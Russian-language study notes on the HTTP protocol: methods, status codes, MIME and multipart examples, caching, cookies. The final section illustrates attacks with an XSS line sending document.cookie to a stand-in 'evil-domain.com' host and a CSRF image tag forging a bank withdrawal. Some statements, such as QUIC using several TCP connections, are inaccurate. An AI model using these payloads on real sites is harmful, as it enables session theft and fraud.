# HTTP протоколы

hypertext protocol - работает в режиме запрос-ответ, использует протокол tcp на транспортном, ip на интернет - уровне

- Обмен идет в формате запрос-ответ
- нет состояния (не знает о предыдущих запросах)
- TCP-сессия в ходе которой один раз устанавливается соединение
- Три агента:
- - клиент
- - сервер (apache/nginx),
- - прокси

По нему передается не только страницы, но и файлы

# структура http сообщения

запрос:

- HTTP-метод
- - get - запрос, read
- - post - передача данных, create
- - head - запрос заголовка страницы
- - put - помещение страницы на сервер, update - замена
- - patch - update частично
- - delete - удаление страницы
- - options - запрос поддерживаемых методов
- путь
- - uniform source locator (протокол, адрес, страница, параметры)
- Версия HTTP-протокола
- заголовки (необязательно)
- тело

ответ:

- Версия HTTP-протокола
- Сообщение состояния - код
- - 100 - информация
- - 200 - успешное выполнение
- - 300 - перенаправление
- - - 301 - постоянное перемещение
- - - 302 - временное перенаправление
- - 400 - ошибка на стороне клиента
- - - 403 доступ запрещен
- - - 404 - страница не найден
- - 500 - внутренняя ошибка сервера
- - - 501 - метод не реализован
- HTTP-заголовки
- тело (необязательно), подразделяют на:
- - Одноресурсные тела (Single-resource bodies), определяется Content-Type и Content-Length.
- - Многоресурсные тела (Multiple-resource bodies) содержать много частей

```bash
# Стартовая строка (URI HTTP/Версия) пример:
# метод
GET /wiki/HTTP HTTP/1.0
# доменное имя
Host: ru.wikipedia.org,
# в ответ придет строка вида
HTTP/1.0 200 OK

# или более сложный ответ
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
ETag: "51142bc1-7449-479b075b2891b"
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html
# пустая строка о том что вся мета информация отправлена
<!DOCTYPE html... (здесь идут 29769 байтов запрошенной веб-страницы)
```

# http сессия

Фазы:

- Клиент устанавливает TCP соединения
- - на сервере порт 80 (8000, 8080), url страницы содержит доменное имя и порт
- Клиент отправляет запрос и ждёт ответа
- Сервер обрабатывает запрос и посылает ответ

TCP не закрывается

# MIME

Multipurpose Internet Mail Extensions или MIME тип, состоит из:

- тип/подтип, где тип: video или text, подтипы - plain, calendar, html
- необязательный параметр тип/подтип;параметр=значение text/plain;charset=UTF-8

Дискретные типы:

- application - application/octet-stream
- audio
- example
- font
- image
- model
- text - text/plain, text/css, text/html, text/javascript
- video

Многокомпонентные типы:

- message
- multipart
- - multipart/form-data, пример:

```html
<!-- для этой формы -->
<form
  action="http://localhost:8000/"
  method="post"
  enctype="multipart/form-data"
>
  <label>Name: <input name="myTextField" value="Test" /></label>
  <label><input type="checkbox" name="myCheckBox" /> Check</label>
  <label
    >Upload file: <input type="file" name="myFile" value="test.txt"
  /></label>
  <button>Send the file</button>
</form>
```

```bash
# при отправке сформируется
Content-Type: multipart/form-data; boundary=aBoundaryString
(other headers associated with the multipart document as a whole)

--aBoundaryString
Content-Disposition: form-data; name="myFile"; filename="img.jpg"
Content-Type: image/jpeg

(data)
--aBoundaryString
Content-Disposition: form-data; name="myField"

(data)
--aBoundaryString
(more subparts)
--aBoundaryString--
```

сам запрос

```bash
POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------8721656041911415653955004498
Content-Length: 465

-----------------------------8721656041911415653955004498
Content-Disposition: form-data; name="myTextField"

Test
-----------------------------8721656041911415653955004498
Content-Disposition: form-data; name="myCheckBox"

on
-----------------------------8721656041911415653955004498
Content-Disposition: form-data; name="myFile"; filename="test.txt"
Content-Type: text/plain

Simple file.
-----------------------------8721656041911415653955004498--
```

- - multipart/byteranges, пример:

```bash
HTTP/1.1 206 Partial Content
Accept-Ranges: bytes
Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5
Content-Length: 385

--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 100-200/1270

eta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="vieport" content
--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 300-400/1270

-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: "Open Sans", "Helvetica
--3d6b6a416f9b5--
```

# сжатие

- сквозное - когда сжатие согласована между клиентом и сервером. Браузер отправляет Accept-Encoding с методами, которые он поддерживает сервер отправляет Content-Encoding, метод которым он сжал, сервер Vary для выбора кеширования
- Пошаговое сжатие - когда сжатие варьируется между прокси, управляется TE заголовком Transfer-Encoding
- без потерь
- с потерями

# http1 и http2

Протокол HTTP/2 отличается от HTTP/1.1 несколькими способами:

- Это двоичный, а не текстовый протокол. Его невозможно прочитать и создать вручную. Несмотря на это препятствие, он позволяет реализовать усовершенствованные методы оптимизации.
- Это мультиплексный протокол. Параллельные запросы могут выполняться по одному и тому же соединению, что снимает ограничения протокола HTTP/1.x.
- Он сжимает заголовки. Поскольку они часто схожи в наборе запросов, это устраняет дублирование и накладные расходы на передаваемые данные.

# quic

разработан для снижении задержки в http протоколах. http работает по одному tcp соединению, quic использует несколько tcp

# кеширование

Виды:

- приватные - для отдельного пользователя в браузере, используется для навигации назад-вперед. При первом запросе страница скачивается в кеш браузера, а последующие запросы возвращают кешированную копию. Управляется заголовком Expires со значением даты когда кеш становится невалидным
- совместного пользования - кеш на прокси, провайдер кеширует данные
- реверсивный прокси сервер - при использовании динамические страницы с запросами на сервер и бд, он кеширует страницы с одинаковыми данными

Кешируют только get-запросы:

- с ответом 200 ок get на запрос html, картинок, файлов
- 301
- 404
- 206

Управление осуществляется заголовком Cache-control:

- со значениями:
- - no-store - нельзя хранить страницу
- - no-cache - перед показом копии узнать изменилась ли
- - must-revalidate
- приватный/не - private, public - на прокси и браузере
- время - max-age=31536000
- актуальность must-revalidate

Conditional get запрос позволяет узнать изменился ли ресурс, управляется тегом

- ETag - токен содержимого файла, у одинаковых файлов он одинаковый, если нужно проверить, то браузер добавляет заголовок:
- - if-none-match со значением хеша
- - if-modified-since - с датой изменения
- Vary

Если ресурс не изменился то отправляется 304 not modified + заголовки, если ресурс изменился - 200

# аутентификация

сценарии как сервер распознает браузер, контролируется такими заголовками как WWW-Authenticate, Proxy-Authenticate. Существую разные варианты аутентификации: Basic, Bearer, Digest, HOBA, Mutual, AWS4-HMAC-SHA256

# куки

Сервер получая запрос может оправить заголовок Set-Cookie, отправляются обратно в заголовке Cookie. Настроить можно по сроку, домен

Пример сессионных куки, так как нет Expires или Max-Age

```bash
# пример ответа с Cookie
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

```bash
# пример ответа с Cookie
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry

```

Secure-cookie - отправляются только по SSL и HTTPS
HTTPonly - не доступны в JS

Атрибуты:

- Domain - если Domain=mozilla.org, то и developer.mozilla.org. включен
- Path - если Path=/docs, то /docs, /docs/Web/
- SameSite - куки отправляются всегда, если даже запрос с другого сервера
- - Strict - только тому сайту, которому куки принадлежат
- - Lax - при навигации
- - None - отключает

Куки с префиксами:

- \_\_Host-
- \_\_Secure-

- Захват сессии (session hijacking) и XSS

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

- Межсайтовая подделка запроса (CSRF - Cross-site request forgery)

```js
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```
